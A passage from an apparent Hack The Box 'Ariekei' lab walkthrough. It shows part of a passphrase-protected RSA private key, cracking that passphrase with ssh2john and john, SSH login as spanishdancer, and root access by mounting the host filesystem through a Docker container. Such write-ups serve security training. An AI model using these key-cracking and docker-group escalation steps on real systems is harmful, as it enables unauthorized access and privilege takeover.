N01CctfSE+JgoNIIdb4SHxTtbOvUtsayQmV8uqzHpCQ3FMfz6uRvl4ZVvNII/x8D
u+hRPtQ1690Eg9sWqu0Uo87/v6c/XJitNYzDUOmaivoIpL0RO6mu9AhXcBnqBu3h
oPSgeji9U7QJD64T8InvB7MchfaJb9W/VTECST3FzAFPhCe66ZRzRKZSgMwftTi5
hm17wPBuLjovOCM8QWp1i32IgcdrnZn2pBpt94v8/KMwdQyAOOVhkozBNS6Xza4P
18yUX3UiUEP9cmtz7bTRP5h5SlDzhprntaKRiFEHV5SS94Eri7Tylw4KBlkF8lSD
WZmJvAQc4FN+mhbaxagCadCf12+VVNrB3+vJKoUHgaRX+R4P8H3OTKwub1e69vnn
QhChPHmH9SrI2TNsP9NPT5geuTe0XPP3Og3TVzenG7DRrx4Age+0TrMShcMeJQ8D
s3kAiqHs5liGqTG96i1HeqkPms9dTC895Ke0jvIFkQgxPSB6y7oKi7VGs15vs1au
9T6xwBLJQSqMlPewvUUtvMQAdNu5eksupuqBMiJRUQvG9hD0jjXz8f5cCCdtu8NN
8Gu4jcZFmVvsbRCP8rQBKeqc/rqe0bhCtvuMhnl7rtyuIw2zAAqqluFs8zL6YrOw
lBLLZzo0vIfGXV42NBPgSJtc9XM3YSTjbdAk+yBNIK9GEVTbkO9GcMgVaBg5xt+6
uGE5dZmtyuGyD6lj1lKk8D7PbCHTBc9MMryKYnnWt7CuxFDV/Jp4fB+/DuPYL9YQ
8RrdIpShQKh189lo3dc6J00LmCUU5qEPLaM+AGFhpk99010rrZB/EHxmcI0ROh5T
1oSM+qvLUNfJKlvqdRQr50S1OjV+9WrmR0uEBNiNxt2PNZzY/Iv+p8uyU1+hOWcz
-----END RSA PRIVATE KEY-----
```

This private key is unfortunately passphrase protected, so we need to crack it. To do this we’ll load up john and run it over our standard rockyou wordlist.

```bash
┌──(deepak㉿kali)-[~/CTF_HTB/Ariekei/spanishdancer]
└─$ ssh2john id_rsa > key              
                                                                                                                                                                                                                                              
┌──(deepak㉿kali)-[~/CTF_HTB/Ariekei/spanishdancer]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt key
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
purple1          (id_rsa)     
1g 0:00:00:00 DONE (2024-12-31 11:34) 16.66g/s 11200p/s 11200c/s 11200C/s sunshine1..kelly
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

It cracks it almost instantly, and so we have our password `purple1`, so now we can freely SSH into the host through port 22.

```bash
ssh -i id_rsa spanishdancer@10.129.17.121
The authenticity of host '10.129.17.121 (10.129.17.121)' can't be established.
ED25519 key fingerprint is SHA256:dItljaDgW4qhoGhj/nNBBbGV4jkIeABm5J/f2aY1ofA.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:205: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.17.121' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-87-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.

Last login: Mon Nov 13 10:23:41 2017 from 10.10.14.2
spanishdancer@ariekei:~$ 

```

## **Privilege Escalation:**

```bash
spanishdancer@ariekei:~$ id 
uid=1000(spanishdancer) gid=1000(spanishdancer) groups=1000(spanishdancer),999(docker)
```

The user is a member of the `docker` group, which allows unprivileged users to manage containers without needing root access. This is because Docker requires root privileges for certain actions. However, this setup can also make it very easy for attackers to escalate privileges. It's a common pitfall, so it's important to be aware of it.

Now, let's take advantage of this to escalate privileges. First, we check the available Docker images.

```bash
spanishdancer@ariekei:~$ docker image ls
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
waf-template        latest              399c8876e9ae        7 years ago         628MB
bastion-template    latest              0df894ef4624        7 years ago         251MB
web-template        latest              b2a8f8d3ef38        7 years ago         185MB
bash                latest              a66dc6cea720        7 years ago         12.8MB
convert-template    latest              e74161aded79        8 years ago         418MB
```

In this step, the user leveraged Docker to escalate their privileges. By running the following command:

```bash
spanishdancer@ariekei:~$ docker run -v /:/root -i -t bash
```

This command mounts the entire file system (`/`) to the `/root` directory in the container, effectively granting the container root access to the host system. The `-i` and `-t` flags provide interactive and terminal access, respectively, while `bash` opens a Bash shell inside the container.

```bash
bash-4.4# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
bash-4.4# ls -la root
total 28
drwx------    3 root     root          4096 Dec 31 04:52 .
drwxr-xr-x   23 root     root          4096 Sep  2  2021 ..
-rw-r--r--    1 root     root          3126 Sep 24  2017 .bashrc
drwx------    2 root     root          4096 Sep  2  2021 .cache
-rw-r--r--    1 root     root           148 Aug 17  2015 .profile
-rw-------    1 root     root          1024 Sep 24  2017 .rnd
-r--------    1 root     root            33 Dec 31 04:52 root.txt
bash-4.4# cat root/root.txt
00c740c3************************

```

![Screenshot from 2024-12-31 13-51-27.png](Ariekei%20-%20Hack%20The%20Box%2016d79dbf67298046b56de543833a950f/Screenshot_from_2024-12-31_13-51-27.png)